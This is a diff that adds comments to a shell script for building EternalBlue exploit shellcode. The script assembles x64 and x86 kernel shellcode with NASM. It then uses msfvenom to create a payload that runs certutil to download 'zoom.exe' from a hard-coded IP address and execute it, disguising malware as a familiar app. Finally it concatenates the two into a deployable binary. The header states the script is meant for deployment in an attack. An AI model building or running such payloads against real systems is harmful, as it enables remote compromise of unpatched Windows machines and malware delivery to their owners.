@@ -7,7 +7,7 @@
 # for each architecture, ready for deployment in an attack scenario exploiting the Eternal Blue vulnerability.
 
 
-
+# Stop execution if any command returns a non-zero exit status.
 set -e
 cat << "EOF"
                  _.-;;-._
@@ -20,26 +20,35 @@ echo "Eternal Blue Windows Shellcode Compiler"
 echo
 echo "Let's compile them windoos shellcodezzz"
 echo
+# Compile the x64 kernel shellcode using NASM (Netwide Assembler).
 echo "Compiling x64 kernel shellcode"
 nasm -f bin eternalblue_kshellcode_x64.asm -o sc_x64_kernel.bin
+
+# Compile the x86 kernel shellcode using NASM.
 echo "'Compiling x86 kernel shellcode'"
 nasm -f bin eternalblue_kshellcode_x86.asm -o sc_x86_kernel.bin
 echo "kernel shellcode compiled"
 
-# Using certutil to download and execute zoom.exe
+# Define the command for the payload: download and execute "zoom.exe" using certutil.
 CMD="cmd /c certutil -urlcache -f http://3.21.21.191/zoom.exe %TEMP%\\zoom.exe & start %TEMP%\\zoom.exe"
 
-# Generate payload with msfvenom
+# Use msfvenom to generate a payload based on the defined command.
+# This payload is designed for x64 architecture.
 echo "Generating payload to download and execute zoom.exe using certutil..."
 msfvenom -p windows/x64/exec CMD="$CMD" -f raw -o sc_x64_msf.bin EXITFUNC=thread
 
+# Confirm payload generation.
 echo "Payload for x64 generated."
 
-echo "MERGING SHELLCODE WOOOO!!!"
+# Begin merging the compiled kernel shellcode with the msfvenom-generated payload.
+echo "MERGING KERNEL SHELLCODE WITH MSFVENOM-GENERATED PAYLOAD!"
 cat sc_x64_kernel.bin sc_x64_msf.bin > sc_x64.bin
 # If there's an x86 version needed, follow similar steps to generate sc_x86_msf.bin and merge it.
 
+# Confirm successful merge of shellcode and payload.
 echo "Shellcode merged successfully."
 
 echo "DONE"
+
+# Exit the script.
 exit 0
